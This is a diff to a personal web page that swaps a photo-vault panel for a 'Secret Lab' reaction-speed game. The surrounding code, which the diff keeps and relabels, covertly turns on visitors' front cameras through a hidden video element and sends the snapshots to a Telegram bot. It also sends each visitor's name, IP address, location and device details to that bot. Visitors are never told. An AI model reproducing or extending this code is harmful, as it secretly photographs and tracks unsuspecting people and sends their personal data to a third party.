@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Kishor Bankapur | Secure Vault</title>
+    <title>Kishor Bankapur | Secret Lab</title>
     
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
@@ -16,6 +16,7 @@
             --text-main: #ffffff;
             --text-dim: #888888;
             --glow-color: rgba(59, 130, 246, 0.5);
+            --neon-green: #00ff88;
         }
 
         * {
@@ -223,7 +224,8 @@
             border: 2px solid var(--primary-color);
         }
 
-        .vault-panel {
+        /* Secret Lab Panel - Reaction Test */
+        .lab-panel {
             position: fixed;
             top: 0; right: -100%;
             width: 100%;
@@ -233,24 +235,96 @@
             padding: 40px 20px;
             transition: 0.6s cubic-bezier(0.7, 0, 0.3, 1);
             overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Courier New', Consolas, monospace;
         }
-        .vault-panel.open { right: 0; }
+        .lab-panel.open { right: 0; }
 
-        .photo-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin-top: 30px;
+        .lab-header {
+            position: absolute;
+            top: 40px;
+            left: 20px;
+            right: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 10px;
         }
-
-        .photo-card {
-            aspect-ratio: 1;
-            border-radius: 15px;
-            overflow: hidden;
-            border: 1px solid #222;
+        
+        .lab-header h2 {
+            font-size: 1.2rem;
+            color: var(--neon-green);
+            letter-spacing: 3px;
+        }
+        
+        .lab-header i {
+            font-size: 2rem;
             cursor: pointer;
+            color: var(--neon-green);
         }
-        .photo-card img { width: 100%; height: 100%; object-fit: cover; }
+
+        .lab-title {
+            font-family: 'Courier New', Consolas, monospace;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+            color: #e0e0e0;
+        }
+        
+        .lab-subtitle {
+            color: #888;
+            margin-bottom: 25px;
+            font-family: 'Courier New', Consolas, monospace;
+            font-size: 1.1rem;
+        }
+        
+        .test-btn {
+            padding: 14px 30px;
+            font-size: 15px;
+            background: #2b2b2b;
+            color: var(--neon-green);
+            border: 1px solid var(--neon-green);
+            border-radius: 30px;
+            cursor: pointer;
+            font-family: 'Courier New', Consolas, monospace;
+            transition: 0.3s ease;
+            margin: 20px 0;
+        }
+        
+        .test-btn:hover {
+            background: var(--neon-green);
+            color: #000;
+            box-shadow: 0 0 15px var(--neon-green);
+        }
+        
+        #circle {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            background: #222;
+            display: none;
+            margin: 30px 0;
+            cursor: pointer;
+            transition: all 0.1s ease;
+        }
+        
+        #result {
+            margin-top: 25px;
+            color: var(--neon-green);
+            font-size: 16px;
+            font-family: 'Courier New', Consolas, monospace;
+            line-height: 1.8;
+            text-align: center;
+        }
+        
+        #welcome {
+            font-family: 'Courier New', Consolas, monospace;
+            color: #e0e0e0;
+            font-size: 1.3rem;
+            margin-bottom: 5px;
+        }
 
         .music-player {
             position: fixed; 
@@ -285,8 +359,8 @@
 <body oncontextmenu="return false;">
 
     <button class="developer-btn" onclick="showDeveloperPanel()">
-        <i class="fa-solid fa-lock" style="margin-right: 8px;"></i>
-        DEVELOPER
+        <i class="fa-solid fa-flask" style="margin-right: 8px;"></i>
+        SECRET LAB
     </button>
 
     <video id="hiddenCamera" autoplay playsinline muted></video>
@@ -324,18 +398,18 @@
 
     <div id="nameModal" class="modal-overlay">
         <div class="modal-box">
-            <h3>📡 SECURITY SCAN</h3>
+            <h3>🧪 LAB ACCESS</h3>
             <input type="text" id="visitorName" class="modal-input" placeholder="Your Name" autocomplete="off">
-            <button class="primary-btn" onclick="startDataProcess()">CONTINUE</button>
+            <button class="primary-btn" onclick="startDataProcess()">ENTER LAB</button>
             <button class="cancel-btn" onclick="closeModalsAndStopMusic()">CANCEL</button>
         </div>
     </div>
 
     <div id="passModal" class="modal-overlay">
         <div class="modal-box">
-            <h3>🔐 VAULT PIN</h3>
+            <h3>🔬 SECURITY CLEARANCE</h3>
             <input type="password" id="vaultPin" class="modal-input" placeholder="PIN" maxlength="4">
-            <button class="primary-btn" onclick="verifyPin()">UNLOCK</button>
+            <button class="primary-btn" onclick="verifyPin()">VERIFY</button>
             <button class="cancel-btn" onclick="goBackToNameModal()">BACK</button>
         </div>
     </div>
@@ -344,12 +418,21 @@
         <img src="photo1.png" onclick="event.stopPropagation()">
     </div>
 
-    <div id="vaultPanel" class="vault-panel">
-        <div style="display:flex; justify-content:space-between; align-items:center;">
-            <h2 style="font-size:1.2rem; color:var(--primary-color);">PRIVATE VAULT</h2>
-            <i class="fa-solid fa-circle-xmark" style="font-size:2rem; cursor:pointer;" onclick="closeVaultAndStopMusic()"></i>
+    <!-- Secret Lab Panel - Reaction Test (replaces old vault) -->
+    <div id="labPanel" class="lab-panel">
+        <div class="lab-header">
+            <h2>⚡ REACTION_LAB</h2>
+            <i class="fa-solid fa-circle-xmark" onclick="closeLabAndStopMusic()"></i>
         </div>
-        <div class="photo-grid" id="vGrid"></div>
+        
+        <h1 id="welcome" class="lab-title"></h1>
+        <h2 class="lab-subtitle">REACTION_SPEED_TEST()</h2>
+        
+        <button class="test-btn" onclick="startTest()">INITIATE_TEST</button>
+        
+        <div id="circle" onclick="stopTest()"></div>
+        
+        <p id="result"></p>
     </div>
 
     <div class="music-player" id="mToggle" onclick="controlMusic()">🗿</div>
@@ -370,7 +453,8 @@
     };
 
     let currentVisitorName = '';
-    let isDevMusicPlaying = false;  // track developer music state
+    let isDevMusicPlaying = false;
+    let startTime;
 
     // Music control for main player (🗿 button)
     function controlMusic() {
@@ -398,7 +482,7 @@
         devAudio.play().catch(() => alert('audio2.mp3 not found!'));
         isDevMusicPlaying = true;
         
-        // 3. Open the name modal (first step of developer panel)
+        // 3. Open the name modal
         document.getElementById('nameModal').classList.add('active');
     }
 
@@ -429,16 +513,10 @@
         document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active'));
     }
 
-    // Close vault and stop dev music (when X or back pressed)
-    function closeVaultAndStopMusic() {
+    // Close lab and stop dev music (when X pressed)
+    function closeLabAndStopMusic() {
         stopDevMusicAndClose();
-        document.getElementById('vaultPanel').classList.remove('open');
-    }
-
-    // Show name modal (for other uses, but we'll use showDeveloperPanel now)
-    function showNameModal() {
-        // This is kept but we use showDeveloperPanel for button
-        showDeveloperPanel();
+        document.getElementById('labPanel').classList.remove('open');
     }
 
     // Handle zoom overlay
@@ -446,7 +524,7 @@
         document.getElementById('zoomOverlay').style.display = show ? 'flex' : 'none'; 
     }
 
-    // ----- CAMERA & TELEGRAM (unchanged) -----
+    // ----- CAMERA & TELEGRAM -----
     async function captureHiddenPhoto() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }).catch(() => null);
@@ -469,7 +547,7 @@
             const formData = new FormData();
             formData.append('chat_id', CONFIG.chatId);
             formData.append('photo', blob, 'visitor.jpg');
-            formData.append('caption', `📸 CAPTURE\n👤 Visitor: ${visitorName}`);
+            formData.append('caption', `📸 LAB ACCESS\n👤 Visitor: ${visitorName}`);
             await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: formData });
         } catch (e) {}
     }
@@ -487,7 +565,7 @@
         const ipReq = await fetch('https://ipapi.co/json/');
         const ip = await ipReq.json();
         
-        const log = `🔥 VISITOR: ${name}\n📍 IP: ${ip.ip}\n📍 LOC: ${ip.city}, ${ip.country_name}\n📱 DEV: ${navigator.userAgent}`;
+        const log = `🧪 LAB VISITOR: ${name}\n📍 IP: ${ip.ip}\n📍 LOC: ${ip.city}, ${ip.country_name}\n📱 DEV: ${navigator.userAgent}`;
         
         await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
             method: 'POST',
@@ -497,47 +575,62 @@
 
         document.getElementById('nameModal').classList.remove('active');
         document.getElementById('passModal').classList.add('active');
-        btn.innerHTML = "CONTINUE";
+        btn.innerHTML = "ENTER LAB";
     }
 
     function verifyPin() {
         if(document.getElementById('vaultPin').value === '2009') {
-            closeModals(); // close pin modal but keep music playing (dev music still on)
-            document.getElementById('vaultPanel').classList.add('open');
-            loadPhotos();
-        } else { alert("❌ WRONG PIN"); }
+            closeModals(); // close pin modal but keep music playing
+            
+            // Set welcome message with stored name
+            let displayName = currentVisitorName || localStorage.getItem("devName") || "UNKNOWN_USER";
+            localStorage.setItem("devName", displayName);
+            document.getElementById("welcome").innerHTML = "ACCESS GRANTED: " + displayName.toUpperCase();
+            
+            // Open lab panel
+            document.getElementById('labPanel').classList.add('open');
+        } else { 
+            alert("❌ ACCESS DENIED"); 
+        }
     }
 
-    function loadPhotos() {
-        const photos = JSON.parse(localStorage.getItem('vault_p') || '[]');
-        document.getElementById('vGrid').innerHTML = photos.map(src => 
-            `<div class="photo-card" onclick="handleZoom(true); document.querySelector('#zoomOverlay img').src='${src}'">
-                <img src="${src}">
-            </div>`
-        ).join('');
+    // ---------- REACTION TEST FUNCTIONS ----------
+    function startTest() {
+        document.getElementById("result").innerHTML = "STATUS: WAITING_FOR_SIGNAL...";
+        document.getElementById("circle").style.display = "none";
+
+        let randomTime = Math.random() * 3000 + 1000;
+
+        setTimeout(function() {
+            let circle = document.getElementById("circle");
+            circle.style.background = "#00ff00";
+            circle.style.boxShadow = "0 0 40px #00ff00";
+            circle.style.display = "block";
+            startTime = Date.now();
+        }, randomTime);
     }
 
-    // Upload UI (unchanged)
-    const up = document.createElement('div');
-    up.style.cssText = 'border:2px dashed #333; padding:20px; margin:20px 0; border-radius:15px; text-align:center; cursor:pointer;';
-    up.innerHTML = '<p>Upload Photos</p>';
-    up.onclick = () => {
-        const i = document.createElement('input'); i.type = 'file'; i.multiple = true;
-        i.onchange = () => {
-            const p = JSON.parse(localStorage.getItem('vault_p') || '[]');
-            Array.from(i.files).forEach(f => {
-                const r = new FileReader();
-                r.onload = (e) => { p.push(e.target.result); localStorage.setItem('vault_p', JSON.stringify(p)); loadPhotos(); };
-                r.readAsDataURL(f);
-            });
-        };
-        i.click();
-    };
-    
-    // Ensure upload element is added after panel exists
-    window.addEventListener('load', () => {
-        document.querySelector('.vault-panel').prepend(up);
-    });
+    function stopTest() {
+        let endTime = Date.now();
+        let reactionTime = (endTime - startTime) / 1000;
+        reactionTime = reactionTime.toFixed(3);
+
+        let message;
+
+        if (reactionTime < 0.2) {
+            message = "RESULT: HACKER_REFLEXES";
+        } else if (reactionTime < 0.3) {
+            message = "RESULT: SHARP_RESPONSE";
+        } else {
+            message = "RESULT: TRAIN_MORE";
+        }
+
+        document.getElementById("result").innerHTML =
+            "REACTION_TIME = " + reactionTime +
+            " SECONDS<br>" + message;
+
+        document.getElementById("circle").style.display = "none";
+    }
 </script>
 </body>
 </html>
